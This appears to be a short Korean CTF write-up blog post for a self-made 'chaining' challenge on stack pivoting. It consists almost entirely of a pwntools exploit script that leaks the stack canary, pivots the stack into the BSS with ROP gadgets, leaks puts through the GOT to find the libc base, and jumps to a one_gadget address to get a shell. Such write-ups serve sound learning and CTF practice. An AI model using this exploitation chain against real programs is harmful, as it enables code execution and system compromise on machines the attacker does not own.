---
layout: post
title: chaining write up
---


stack pivot을 공부하고 만든 문제.

```python
from pwn import *

s = process("./chaining")
e = ELF("./chaining")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
#s = remote("0",9999)
#context.log_level ='debug'
#/lib/x86_64-linux-gnu/libc.so.6
#pppr = 0x40076a
#pr = 0x400775


prdi = 0x400973
prsi = 0x400971
leave_ret = 0x400904
main = 0x4007b6

fake_buf1 = e.bss() + 0x500
fake_buf2 = e.bss() + 0x600

s.recvuntil(":\n")
s.send("A"*41)
s.recvuntil("A"*41)
canary=u64('\x00'+s.recv(7))
print(hex(canary))
s.recvuntil(": ")

payload = "A"*24 + p64(canary)
payload += p64(fake_buf1)


payload += p64(prdi)
payload += p64(0)
payload += p64(prsi)
payload += p64(fake_buf1)
payload += p64(0)
payload += p64(e.plt['read'])

payload += p64(leave_ret)

#payload += p64(main)
s.send(payload)

payload = p64(fake_buf2)

payload += p64(prdi)
payload += p64(e.got['puts'])
payload += p64(e.plt['puts'])

payload += p64(prdi)
payload += p64(0)
payload += p64(prsi)
payload += p64(fake_buf2)
payload += p64(0)
payload += p64(e.plt['read'])

payload += p64(leave_ret)
#payload += p64(main)
s.send(payload)

s.recvuntil("byebye~")
s.recv(0xff-7)
leak_puts=u64(s.recv(6)+'\x00\x00')
base = leak_puts - libc.symbols['puts']
magic = base + 0x4f322
print(hex(base))
print(hex(magic))

payload = p64(fake_buf1)
payload += p64(magic)
s.send(payload)
s.recv()

s.interactive()


```
